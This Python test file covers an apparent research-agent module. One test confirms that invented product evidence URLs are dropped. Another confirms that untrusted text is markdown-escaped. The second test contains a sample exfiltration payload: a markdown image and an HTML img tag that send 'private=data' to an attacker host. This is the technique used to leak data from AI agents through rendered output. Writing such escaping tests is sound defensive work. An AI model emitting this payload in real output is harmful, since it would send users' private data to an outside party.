"""Evidence allowlist never admits invented product URLs."""

from pydantic import HttpUrl

from brainstorm_agent.core.research import (
    Benchmark,
    Product,
    ResearchSynthesis,
    SearchResult,
    escape_markdown,
    render_benchmark,
    validate_evidence,
)


def test_unknown_evidence_discarded() -> None:
    result = SearchResult(
        title="Known",
        url=HttpUrl("https://example.com/known"),
        snippet="Board",
        provider="fake",
    )
    product = Product(
        name="Invented",
        url=HttpUrl("https://example.com/invented"),
        summary="Unsupported",
        key_features=[],
        pricing=None,
        evidence_urls=[HttpUrl("https://example.com/invented")],
    )
    assert not validate_evidence(
        ResearchSynthesis(products=[product], features=[], assumptions=[], open_questions=[]),
        [result],
    ).products


def test_benchmark_escapes_untrusted_markdown() -> None:

    hostile = '![x](https://attacker.invalid/?private=data)<img src="https://attacker.invalid">'
    product = Product(
        name=hostile,
        url=HttpUrl("https://example.com/product"),
        summary=hostile,
        key_features=[hostile],
        pricing=hostile,
        evidence_urls=[HttpUrl("https://example.com/product")],
    )
    benchmark = Benchmark(
        id="fixture",
        version=1,
        queries=[],
        results=[],
        synthesis=ResearchSynthesis(
            products=[product],
            features=[],
            assumptions=[hostile],
            open_questions=[hostile],
        ),
    )
    markdown = render_benchmark([benchmark])
    assert hostile not in markdown
    assert escape_markdown(hostile) in markdown
    assert "\\!\\[x\\]" in markdown
